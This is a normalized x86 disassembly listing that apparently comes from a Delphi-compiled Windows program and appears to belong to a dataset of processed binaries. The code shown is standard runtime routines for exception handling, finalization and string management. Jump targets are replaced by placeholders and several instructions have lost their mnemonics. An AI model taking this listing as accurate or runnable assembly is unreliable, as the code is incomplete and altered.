cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402c8c
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403a3c
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403724
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403a74
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_40402c
sub_403a9c
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_406058
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_4032e8
call sub_403684
sub_403af0
call sub_406058
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_4032e8
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_40374c
jmp edx
sub_403b38
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_402870
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403c98
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403cc0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403d06
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403d20
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403d66
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403dc0
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405dec
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403de4
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405dec
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403e0c
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403e30
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403e8c
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403ebc
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_4012dc
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4012a4
push eax
call sub_4012c4
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4012a4
push eax
call sub_4012c4
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403f48
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403e30
call sub_403ebc
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403cc0
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403c98
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_4058b8
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403e8c
push eax
call sub_4012f4
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_404038
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_40278c
pop eax
sub_40405c
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_40278c
sub_40408c
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_4040fc
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_402968
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_40278c
sub_4040d0
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_40278c
sub_4040fc
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_40276c
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_404128
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_4040fc
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_404038
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_402968
sub_404158
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_404178
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call sub_401354
pop ebp
retn 0x4
sub_404194
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404038
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_404684
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404158
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_404158
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404684
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404128
jmp r-xdata
sub_404230
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404128
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404260
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404194
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4042a8
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_404128
not ecx
sub_4042d4
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_402968
pop ebx
retn
mov ecx ebx
sub_404300
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_40408c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_404684
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_404684
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_402968
pop edi
pop esi
pop ebx
retn
sub_404344
test edx edx
je r-xdata
mov edx ecx
jmp sub_40408c
test ecx ecx
je sub_40408c
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404300
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_4040fc
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_402968
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_402968
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_40408c
pop edx
pop eax
jmp sub_404300
call sub_40408c
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4043b8
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_4040fc
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_404684
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_402968
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_40408c
dec [ edx - 0x8 ]
sub_404444
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404504
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_4040fc
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_402968
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_40278c
sub_404558
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_404038
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_404128
jmp r-xdata
pop ebx
retn 0x4
sub_404598
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404504#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_402968
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_404684
mov edi ecx
sub_4045e0
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_404684
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_402968
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_402968
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_40463c
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_404684
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_404038
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_4040fc
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_4027ac
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_402968
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_404730
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call sub_401394
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404754
test edx edx
je sub_404718
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_404718
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_4028c8
retn
sub_404778
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404718
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404960
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404178
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_404178
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404960
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404804
jmp r-xdata
sub_404804
test ecx ecx
je sub_404718
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_4028c8
pop edx
push [ edx ]
mov [ edx ] eax
call sub_401394
retn
sub_404828
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404804
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404890
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404914
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_404884
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404804
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404960
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_404708
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4046f0
mov ebx eax
mov eax [ edi ]
call sub_404884
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_402968
mov eax esi
sub_4049a4
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_4049d4
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_4049d4
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_4049d4
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4049a4
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_4028c8
sub_404a74
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404ac0
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404ac0
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_40405c
jmp r-xdata
call sub_404038
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_404730
jmp r-xdata
call sub_404718
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404aa8
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404ac0
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404a74
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_405928
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_40527c
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_4028c8
sub_404bd0
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_402968
mov edx [ eax + esi ]
add eax ebx
call sub_40408c
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404754
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404bb8
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_402968
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
